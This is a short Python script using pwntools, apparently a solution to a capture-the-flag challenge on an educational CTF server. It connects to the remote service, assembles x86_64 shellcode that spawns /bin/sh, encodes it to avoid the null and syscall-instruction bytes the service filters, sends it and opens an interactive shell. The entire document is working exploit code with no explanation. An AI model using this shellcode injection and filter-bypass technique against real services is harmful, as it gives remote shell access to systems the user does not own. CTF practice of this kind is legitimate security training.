import os
from pwn import *
rem = remote('edu-ctf.csie.org', 10150)
rem.recvuntil('shellcode >')

context.clear(arch='x86_64')
shellcode = asm(shellcraft.sh())
avoid = '\x00\x05\x0f'
encoded = pwnlib.encoders.encoder.encode(shellcode, avoid, force = 1)
print('shellcode is ', shellcode)
print('encoded is ', encoded)
print(disasm(encoded))

rem.sendline(encoded)
rem.interactive()
